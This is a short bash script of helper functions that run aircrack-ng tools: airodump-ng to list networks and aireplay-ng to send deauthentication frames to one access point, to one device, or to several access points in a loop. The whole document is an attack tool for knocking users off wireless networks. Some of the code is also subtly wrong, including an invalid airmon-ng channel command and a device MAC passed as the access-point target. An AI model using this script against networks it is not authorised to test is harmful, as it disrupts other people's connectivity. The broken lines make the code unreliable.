#!/bin/bash

check_wifi_list() {
  airodump-ng wlan0
}

set_channel() {
  read -p "Enter channel number: " channel
  airmon-ng set wlan0 $channel
}

deauthenticate_wifi() {
  read -p "Enter WiFi MAC address: " mac
  aireplay-ng -0 1 -a $mac wlan0
}

show_connected_devices() {
  airodump-ng wlan0
}

deauthenticate_specific_device() {
  read -p "Enter device MAC address: " mac
  aireplay-ng -0 1 -a $mac wlan0
}

deauthenticate_multiple_wifi() {
  read -p "Enter WiFi MAC addresses (space-separated): " macs
  for mac in $macs; do
    aireplay-ng -0 1 -a $mac wlan0
  done
}
